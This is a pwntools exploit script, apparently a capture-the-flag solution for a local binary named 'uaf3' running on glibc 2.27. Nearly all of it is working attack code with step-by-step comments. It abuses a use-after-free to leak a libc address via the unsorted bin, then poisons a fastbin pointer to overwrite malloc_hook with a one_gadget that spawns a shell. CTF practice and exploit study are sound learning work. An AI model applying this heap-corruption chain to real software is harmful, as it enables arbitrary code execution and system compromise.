#!/usr/bin/env python2
# -*- coding: utf-8 -*
import re
import os
from pwn import *


se      = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb, timeout = 1)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
lg = lambda name,data : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)

def debug(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    gdbscript = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p, gdbscript)
    time.sleep(1)

def alloc(idx, size):
    sla(">", "1")
    sla("idx:", str(idx))
    sla("size: ", str(size))

def free(idx):
    sla(">", "2")
    sla("idx:", str(idx))

def read(idx, data):
    sla(">", "3")
    sla("idx:", str(idx))
    sa("data:", data)

def write(idx):
    sla(">", "4")
    sla("idx: \n", str(idx))
    s = ru("1. alloc")
    return s

elf = ELF('./uaf3')
context(arch = elf.arch ,log_level = 'debug', os = 'linux',terminal = ['tmux', 'splitw', '-hp','62'])
p = process("./uaf3")




## [Glibc 2.27 UAF fastbin Attack Roadmap]
## 1. Leak libc address from unsorted bin
## 2. Leverage UAF vulnerability to perform tcachebin attack to malloc_hook
## 3. Modify malloc_hook to one_gadget




## ---------------------- [Step 1] -------------------------- ##
## Prepare heap chunk for attacking

## We first fullfill tcache bin
## -- calloc() does not take heap chunk from tcache, but free() puts heap chunk into tcachebin
for i in range(0, 7):
    alloc(i, 0x30)
    free(i)

for i in range(0, 7):
    alloc(i, 0x60)
    free(i)

alloc(0, 0x30)
alloc(1, 0x30)
alloc(2, 0x600)
alloc(3, 0x60)
alloc(4, 0x10)


## Size of chunk_0 and chunk_1 is 0x30, would be placed into tcache bin
## fastbin(0x40) --> chunk_0 --> chunk_1
free(1)
free(0)


## To bypass size check, we need to forge a size header for 0x40 fastbin
## The size of header is 0x10, thus the total size is 0x10 + 0x30 = 0x40, the last bit is freed flag
read(1, p64(0x41) * 6)


## First use gdb to check the lowest byte of chunk_2
## Modify fd of chunk_0, let it points to chunk_2 - 0x20
## fast_bin(0x30) --> chunk_0 --> chunk_2 - 0x20
read(0, '\x80')


## Take out heap chunk from fast bin
## chunk_5 == chunk_0
## chunk_6 == chunk_2 - 0x20
alloc(5, 0x30)
alloc(6, 0x30)


## Since calloc erase the header of chunk_2, we need recover it
read(6, "a" * 0x10 + p64(0) + p64(0x611))


## Size of chunk 2 is 0x600, would be placed into unsorted bin 
free(2)


## Since chunk_6 is overlapped with chunk_2, we can leak out its address by chunk_6
read(6, "a" * 0x20)
leak_addr = u64(write(6)[0x20 : 0x26] + "\x00\x00")


## Calculate system and free_hook address
libc_base = leak_addr - 0x3ebca0
system_addr = libc_base + 0x4f420
malloc_hook_addr = libc_base + 0x3ebc30
one_gadget = libc_base + 0x4f302

# [one gadget]
# 0x4f302 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL






## ---------------------- [Step 2] -------------------------- ##
free(3)
## Size of chunk_6 is 0x70, among size of fastbin
## fast_bin(0x70) --> chunk_6


## Edit fd pointer of chunk_6, let it point to malloc_hook - 0x23
read(3, p64(malloc_hook_addr - 0x23))


## fast_bin(0x70) --> chunk_6 --> malloc_hook - 0x23
## chunk_7 would be overlapped with chunk_6
alloc(7, 0x60)


## fast_bin(0x70) --> malloc_hook - 0x23
## chunk_8 would be overlapped with malloc_hook - 0x23
alloc(8, 0x60)






## ---------------------- [Step 3] -------------------------- ##
## Modify malloc_hook to be one_gadget
read(8, "a" * 0x13 + p64(one_gadget))

## Execute one_gadget
alloc(0, 0)
p.interactive()